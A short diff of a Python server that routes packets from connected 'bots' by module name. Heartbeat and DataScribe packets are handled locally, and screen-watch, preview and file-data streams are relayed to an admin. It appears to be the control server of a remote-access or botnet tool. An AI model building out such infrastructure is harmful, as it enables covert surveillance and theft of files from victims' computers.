@@ -55,20 +55,25 @@ class BotConnectionHandler:
         logger.info(f"[+] Бот {cid} подключен")
 
     async def _process_packet(self, cid, writer, packet):
-        """Разбор пакета: разделение DataScribe и бинарных потоков"""
+        """Разбор пакета: только то, что нужно серверу, остальное — в менеджер"""
         try:
             id_len, mod_len = packet[0], packet[1]
             module = packet[6 + id_len : 6 + id_len + mod_len].decode('utf-8', errors='ignore')
 
+            # 1. Снимаем метрики трафика
+            add_bytes(len(packet))
+
+            # 2. Только системные модули для логики сервера
             if module == "DataScribe":
                 return await self._handle_datascribe(cid, packet)
             
             if module == "Heartbeat":
                 return await self._handle_heartbeat(cid, writer)
 
-            # Проброс остальных модулей (видео, файлы) без изменений
-            add_bytes(len(packet))
+            # 3. ВСЕ ОСТАЛЬНОЕ (Preview, ScreenWatch, FileData и т.д.) 
+            # Просто пробрасываем админу без лишних вопросов
             manager.broadcast_packet_sync(packet)
+
         except Exception as e:
             logger.error(f"Packet Error [{cid}]: {e}")
 
